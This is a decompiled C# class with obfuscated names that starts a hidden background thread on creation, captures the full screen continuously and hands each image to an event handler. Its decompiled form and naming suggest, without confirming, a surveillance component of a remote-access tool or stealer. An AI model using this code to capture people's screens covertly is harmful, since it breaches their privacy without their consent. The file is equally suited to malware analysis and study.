using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Threading;
using System.Windows.Forms;

namespace Dodjins
{
	// Token: 0x02000013 RID: 19
	public class ddleuwja : IDisposable
	{
		// Token: 0x0600006E RID: 110 RVA: 0x00003CE0 File Offset: 0x00001EE0
		public ddleuwja()
		{
			this._screenSize = this.GetScreenSize();
			this._buffer = new Bitmap(this._screenSize.Width, this._screenSize.Height);
			this._shouldRun = true;
			this._screenshotThread = new Thread(new ThreadStart(this.ScreenshotThread))
			{
				IsBackground = true
			};
			this._screenshotThread.Start();
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00003D54 File Offset: 0x00001F54
		public Size GetScreenSize()
		{
			return Screen.PrimaryScreen.WorkingArea.Size;
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00003D78 File Offset: 0x00001F78
		public Bitmap GetScreenshot()
		{
			using (Graphics graphics = Graphics.FromImage(this._buffer))
			{
				graphics.InterpolationMode = InterpolationMode.Bicubic;
				graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
				graphics.SmoothingMode = SmoothingMode.HighSpeed;
				graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), this._screenSize);
			}
			return this._buffer;
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00003DF0 File Offset: 0x00001FF0
		public void ScreenshotThread()
		{
			while (this._shouldRun)
			{
				Bitmap screenshot = this.GetScreenshot();
				Bitmap obj = screenshot;
				lock (obj)
				{
					stataken onScreenshotTaken = this.OnScreenshotTaken;
					if (onScreenshotTaken != null)
					{
						onScreenshotTaken(screenshot);
					}
				}
			}
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00003E54 File Offset: 0x00002054
		public void Dispose()
		{
			bool flag = this._buffer != null;
			if (flag)
			{
				this._buffer.Dispose();
			}
			this._buffer = null;
			this._shouldRun = false;
			bool flag2 = this._screenshotThread != null;
			if (flag2)
			{
				this._screenshotThread.Abort();
			}
			this._screenshotThread = null;
		}

		// Token: 0x04000031 RID: 49
		public stataken OnScreenshotTaken;

		// Token: 0x04000032 RID: 50
		private Size _screenSize;

		// Token: 0x04000033 RID: 51
		private Bitmap _buffer;

		// Token: 0x04000034 RID: 52
		private Thread _screenshotThread;

		// Token: 0x04000035 RID: 53
		private bool _shouldRun;
	}
}
